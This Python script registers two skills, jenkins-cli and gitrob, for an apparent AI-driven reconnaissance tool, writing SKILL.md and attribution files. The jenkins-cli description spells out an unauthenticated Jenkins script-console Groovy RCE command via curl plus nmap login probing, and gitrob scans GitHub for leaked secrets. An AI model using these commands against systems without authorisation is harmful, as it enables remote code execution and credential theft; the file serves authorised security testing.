#!/usr/bin/env python3
"""Add 2 DevOps / SCM exposure skills to the MANAGED skills layer.

Skills added (2026-06-10, R3 P0):
  jenkins-cli, gitrob

Why these two (and not GitLab CLI / Docker Registry CLI):
  - jenkins-cli: Jenkins is the most-exposed self-hosted CI in 2026
    (Shodan reports >90k hosts with script console open). nmap NSE
    `jenkins-info` + default creds + script console anonymous exec
    are the canonical DevOps attack chain.
  - gitrob: lightweight GitHub repo scanner (file pattern + secret
    regex). Complements trufflehog (entropy-based) with regex-based
    detection for AWS keys / GitHub PATs / Slack tokens.

Out of scope (per user 2026-06-10):
  - nuclei DevOps templates (excluded)
  - kube-hunter (K8s-only, separate S-tier if needed)
  - GitLab CLI / Bitbucket CLI (lower exposure, can add later)
"""

from __future__ import annotations

import re
import sys
from dataclasses import dataclass
from pathlib import Path

DST_ROOT = Path.home() / ".opensquilla" / "skills"
ATTRIBUTION_DATE = "2026-06-10"

NET = "network"
SHELL = "shell"
FS_R = "filesystem-read"
HTTP_O = "network.http"


@dataclass(frozen=True)
class SkillMeta:
    name: str
    risk: str
    triggers: tuple[str, ...]
    bins: tuple[str, ...]
    capabilities: tuple[str, ...]
    install_brew: tuple[tuple[str, str], ...] = ()
    install_go: tuple[str, ...] = ()
    install_pip: tuple[str, ...] = ()
    install_apt: tuple[tuple[str, str], ...] = ()
    description: str = ""
    upstream_url: str = ""


DEVOPS_SKILLS: tuple[SkillMeta, ...] = (
    SkillMeta(
        name="jenkins-cli",
        risk="high",
        triggers=(
            "jenkins-cli",
            "jenkins",
            "Jenkins 暴露",
            "script console",
            "Jenkins 默认凭据",
            "CI/CD 暴露",
        ),
        bins=("jenkins-cli", "jenkins_cli"),
        capabilities=(SHELL, NET, HTTP_O, FS_R),
        install_brew=(("jenkins-cli", "jenkins-cli"),),
        install_pip=("python-jenkins",),
        description=(
            "Jenkins CLI client + script console exploit primitive. Default "
            "usage for recon is `jenkins-cli -s http://target:8080 who-am-i` "
            "(works anonymously on misconfigured instances); for exploitation "
            "use `nmap -p 8080 --script jenkins-info,jenkins-login` plus "
            "script console anonymous Groovy exec via "
            "`curl -d 'script=println(\"id\".execute().text)' "
            "http://target:8080/scriptText`. Risk: HIGH — script console "
            "executes arbitrary Groovy = RCE on the Jenkins master. "
            "MUST be gated by ROE.aggressive (本轮 ROEEvidence 不扩, agent "
            "读 ROE 全段); default aggressive=false 不允许 script-console exec."
        ),
        upstream_url="https://github.com/jenkinsci/jenkins-cli",
    ),
    SkillMeta(
        name="gitrob",
        risk="medium",
        triggers=(
            "gitrob",
            "GitHub 仓库扫描",
            "公开仓库密钥",
            "github repo scan",
            "敏感文件泄露",
        ),
        bins=("gitrob",),
        capabilities=(SHELL, NET, HTTP_O, FS_R),
        install_go=("github.com/michenriksen/gitrob@latest",),
        install_brew=(("gitrob", "gitrob"),),
        description=(
            "Lightweight GitHub organization / user / repo scanner for "
            "sensitive files and accidentally-committed secrets. Default usage "
            "is `gitrob analyze <org-or-user> --output ~/.opensquilla/evidence/gitrob/` "
            "after `gitrob -github-access-token <token> setup`. Uses regex "
            "pattern matching against filenames + file content; complements "
            "trufflehog's entropy-based detection. Risk: medium — does only "
            "read against the public GitHub API, but may trigger GitHub's "
            "abuse rate limits at scale."
        ),
        upstream_url="https://github.com/michenriksen/gitrob",
    ),
)


# ---------------------------------------------------------------------------
# Helpers (mirror add_cloud_assets_skills.py)
# ---------------------------------------------------------------------------


def yaml_escape(s: str) -> str:
    if re.search(r"[:#\n\"']", s):
        return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'
    return s


def render_frontmatter(meta: SkillMeta) -> str:
    lines: list[str] = ["---"]
    lines.append(f"name: {meta.name}")
    lines.append(f"description: {yaml_escape(meta.description)}")
    lines.append("always: false")
    lines.append("triggers:")
    for t in meta.triggers:
        lines.append(f"  - {yaml_escape(t)}")
    lines.append("provenance:")
    lines.append("  origin: recon-coverage-gap-fix-r3-2026-06-10")
    lines.append("  license: per-tool")
    if meta.upstream_url:
        lines.append(f"  upstream_url: {meta.upstream_url}")
    lines.append("  maintained_by: zlpc")
    lines.append("metadata:")
    lines.append("  opensquilla:")
    lines.append(f"    risk: {meta.risk}")
    if meta.capabilities:
        lines.append("    capabilities:")
        for c in meta.capabilities:
            lines.append(f"      - {c}")
    if meta.bins:
        lines.append("    requires:")
        lines.append("      bins:")
        for b in meta.bins:
            lines.append(f"        - {b}")
    if meta.install_brew or meta.install_go or meta.install_pip or meta.install_apt:
        lines.append("    install:")
        for formula, bin_name in meta.install_brew:
            lines.append("      - kind: brew")
            lines.append(f"        id: {formula}")
            lines.append(f"        formula: {formula}")
            lines.append("        bins:")
            lines.append(f"          - {bin_name}")
        for go_path in meta.install_go:
            bin_name = go_path.rsplit("/", 1)[-1]
            lines.append("      - kind: go")
            lines.append(f"        path: {go_path}")
            lines.append("        bins:")
            lines.append(f"          - {bin_name}")
        for mod in meta.install_pip:
            lines.append("      - kind: uv")
            lines.append(f"        module: {mod}")
            lines.append("        bins:")
            lines.append(f"          - {mod}")
        for pkg, bin_name in meta.install_apt:
            lines.append("      - kind: apt")
            lines.append(f"        package: {pkg}")
            lines.append("        bins:")
            lines.append(f"          - {bin_name}")
    lines.append("---")
    return "\n".join(lines) + "\n"


def render_body(meta: SkillMeta) -> str:
    trigger_str = ", ".join(repr(t) for t in meta.triggers)
    return (
        f"\n# {meta.name}\n\n"
        f"{meta.description}\n\n"
        f"**Triggers**: {trigger_str}\n\n"
        f"**Bins**: {', '.join(meta.bins) or '(none)'}\n\n"
        f"**Risk**: {meta.risk}\n\n"
        f"**Capabilities**: {', '.join(meta.capabilities) or '(none)'}\n\n"
        f"Added by `scripts/add_devops_skills.py` on {ATTRIBUTION_DATE} "
        f"as part of the R3 P0 DevOps expansion. See "
        f"`docs/delivery/recon-coverage-gap-fix.delivery-solution.md` S14.\n"
    )


def render_attribution(meta: SkillMeta) -> str:
    upstream = meta.upstream_url or "(see upstream project)"
    return (
        f"# Attribution — {meta.name}\n\n"
        f"Added on {ATTRIBUTION_DATE} as part of the R3 P0 DevOps bundle.\n\n"
        f"- **Triggers**: {', '.join(repr(t) for t in meta.triggers)}\n"
        f"- **Bins**: {', '.join(meta.bins) or '(none)'}\n"
        f"- **Upstream reference**: {upstream}\n"
        f"- **Risk**: {meta.risk}\n"
        f"- **Maintainer**: zlpc\n\n"
        f"This skill is a thin OpenSquilla-side wrapper.\n"
    )


def write_skill(meta: SkillMeta) -> Path:
    dst = DST_ROOT / meta.name
    dst.mkdir(parents=True, exist_ok=True)
    (dst / "SKILL.md").write_text(
        render_frontmatter(meta) + render_body(meta), encoding="utf-8"
    )
    (dst / "ATTRIBUTION.md").write_text(render_attribution(meta), encoding="utf-8")
    return dst


def main() -> int:
    DST_ROOT.mkdir(parents=True, exist_ok=True)
    written: list[str] = []
    for meta in DEVOPS_SKILLS:
        dst = write_skill(meta)
        written.append(f"{meta.name} -> {dst}")
    print(f"OK  wrote {len(written)}  devops skills -> {DST_ROOT}")
    for line in written:
        print(f"     + {line}")
    return 0


if __name__ == "__main__":
    sys.exit(main())